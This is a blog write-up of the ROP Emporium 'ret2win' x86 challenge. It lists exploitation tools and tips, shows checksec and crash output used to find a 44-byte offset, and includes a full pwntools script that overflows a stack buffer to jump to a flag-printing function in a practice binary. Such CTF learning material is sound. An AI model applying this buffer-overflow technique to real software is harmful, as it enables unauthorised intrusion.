---
---
layout: post
title:  "ROP Emporium - ret2win"
date:   2023-08-05 19:59:44 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Introduction
Lately I've decided that my next current goal is to gain deeper exploitation knowledge, regarding ARM and MIPS architectures. And whats better than learning by hands?
The ROP Emporium platform offers 8 exploitation challenges, for `x86, x64, ARMv5, mips`. 
Lets do them all!

## Tools
To find ROP gadgets, my regular go-to tool is `ropper`. \
Just in case it might miss few gadgets here and there, I would also use `ROPGadget` (which is abit more recommended for ARM architecture). \
`pwntools` is mandatory for such challenges.

As a debugger, I'd use `pwndbg`. \
It has great integration with `pwntools`, which can automate debugging tasks by running `gdb` from a pythonic script. 

`checksec` is good to learn the challenge's mitigations settings. `rabin2` is also an option.

## Tips
1. Note that for stripped binaries, external functions (that are being imported by the binary) names may be resolved from their shared objects:
```bash
nm -u <binary>  # list external functions
rabin2 -qs <binary> | grep -ve imp -e ' 0 '  # try to list internal functions
```

2. The ROP Emporium challenges contains a `usefulGadgets` symbol, which marks the address of added gadgets to the binary. 

3. In order to find strings (avoid using `strings` binary):
```bash
rabin2 -z split
```

4. Make sure the stack is 16-Byte aligned before `call` instruction.

5. When debugging with GDB, calling `system` with invalid string may start `/usr/bin/bash`. 
   This works specifically within a debugger, not the remote target. 
   
6. Use `ltrace` to track library calls. 

## x86

```bash
$ file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped

$ checksec ret2win32
[*] '/home/itay/projects/rop_emporium/rop_emporium_all_challenges/ret2win32/ret2win32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```
This challenge reads 56 bytes into 32 stack buffer, via `read` call. \
A function named `ret2win` prints the flag, and located within `0x804862c`. 

The amount of needed garbage bytes is 44:
```bash
$ sudo dmesg -C
$ echo `python -c 'print("A"*44 + "B" * 4)'` | ./ret2win32
$ sudo dmesg
[ 4285.835462] show_signal_msg: 7 callbacks suppressed
[ 4285.836441] ret2win32[32818]: segfault at 42424242 ip 0000000042424242 sp 00000000ff9c0940 error 14 in libc.so.6[f7c00000+20000]
[ 4285.836884] Code: Unable to access opcode bytes at RIP 0x42424218.
```
The exploit for x86 is simple (would use it as a skeleton for most of the challenges):
```python
import pwn  
import logging  
  
  
logging.basicConfig(  
    level=logging.DEBUG,  
    format= '[%(asctime)s] {%(pathname)s:%(lineno)d} %(levelname)s - %(message)s',  
    datefmt='%H:%M:%S'  
)  
logger = logging.getLogger(__name__)  
  
DEBUG = True  
BINARY = './ret2win32'  
GOAL_FUNCTION = 'ret2win'  
GOAL_ADDRESS = 0  
  
GDB_SCRIPT = f'''  
set pagination off  
set disassembly-flavor intel  
  
b *0x804862c  
commands printf "woot, reached goal address"  
bt  
c  
end  
  
c  
'''  
  
  
def set_properties(elf):  
    global GOAL_ADDRESS  
    GOAL_ADDRESS = elf.symbols[GOAL_FUNCTION]  
  
    pwn.context.bits = elf.bits  
    pwn.context.endian = elf.endian  
    pwn.context.arch = elf.arch  
    pwn.context.log_level = 'debug'  
  
  
def create_shellcode():  
    shellcode = b''  
    shellcode += 44 * b'A'  
    shellcode += pwn.p32(GOAL_ADDRESS)  
  
    logging.info(f'Created shellcode:\n{shellcode}')  
  
    return shellcode  
  
  
def exploit(p, shellcode):  
    if DEBUG:  
        pwn.gdb.attach(p, GDB_SCRIPT)  
  
    p.sendline(shellcode)  
    p.recvuntil('Thank you!')  
  
    data = p.recvall()  
    logger.info(f'FLAG:{data}')  
  
    p.interactive()  
  
  
def main():  
    elf = pwn.ELF(BINARY)  
    set_properties(elf)  
  
    shellcode = create_shellcode()  
  
    p = pwn.process(BINARY)  
  
    exploit(p, shellcode)  
  
  
if __name__ == '__main__':  
    main()
```
